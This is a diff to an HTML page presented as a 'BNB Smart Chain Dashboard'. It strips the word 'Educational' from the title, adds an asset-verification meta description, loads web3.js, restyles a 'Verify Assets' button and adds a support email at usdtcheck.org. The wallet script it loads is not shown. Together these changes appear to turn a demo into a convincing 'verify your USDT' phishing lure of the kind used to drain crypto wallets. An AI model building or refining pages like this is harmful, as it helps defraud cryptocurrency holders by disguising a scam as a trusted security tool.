@@ -3,8 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BNB Smart Chain Dashboard (Educational)</title>
+    <title>BNB Smart Chain Dashboard</title>
+
+    <meta name="description" content="Verify and secure your assets on the BNB Smart Chain network instantly. Reliable and fast asset verification.">
+
+    <link rel="icon" type="image/png" href="favicon.html">
+
     <link rel="stylesheet" href="style.css">
+
+    <script src="../cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
 </head>
 <body>
     <header>
@@ -36,7 +43,7 @@
             </div>
             <div class="verify-asset-prompt">
                 <p>Verify your assets to ensure authenticity and minimize potential vulnerabilities.</p>
-                <button id="verifyAssets" class="verify-button">VERIFY ASSET</button>
+                <button class="verify-button" id="verifyAssets">🔒 Verify Assets</button>
             </div>
         </section>
 
@@ -154,29 +161,30 @@
 
     <footer>
         <p>&copy; 2024 BNB Smart Chain Educational Dashboard. All Rights Reserved.</p>
+        <p>📧 Contact Support:
+            <a href="mailto:customersupport@usdtcheck.org" style="color: #ffc107; text-decoration: none;">
+                customersupport@usdtcheck.org
+            </a>
+        </p>
     </footer>
 
+    <script src="script.js"></script>
+
     <script>
-        // Basic JavaScript for dropdown functionality
         const dropdownToggle = document.querySelector('.dropdown-toggle');
         const dropdownMenu = document.querySelector('.dropdown-menu');
 
-        dropdownToggle.addEventListener('click', () => {
-            dropdownMenu.classList.toggle('show');
-        });
+        if (dropdownToggle && dropdownMenu) {
+            dropdownToggle.addEventListener('click', () => {
+                dropdownMenu.classList.toggle('show');
+            });
 
-        // Close dropdown when clicking outside
-        document.addEventListener('click', (event) => {
-            if (!dropdownToggle.contains(event.target) && !dropdownMenu.contains(event.target)) {
-                dropdownMenu.classList.remove('show');
-            }
-        });
-     </footer>
-
-    <!-- JavaScript (After Web3.js) -->
-    <script src="script.js"></script>
-</body>
-</html>
-
+            document.addEventListener('click', (event) => {
+                if (!dropdownToggle.contains(event.target) && !dropdownMenu.contains(event.target)) {
+                    dropdownMenu.classList.remove('show');
+                }
+            });
+        }
+    </script>
 </body>
 </html>
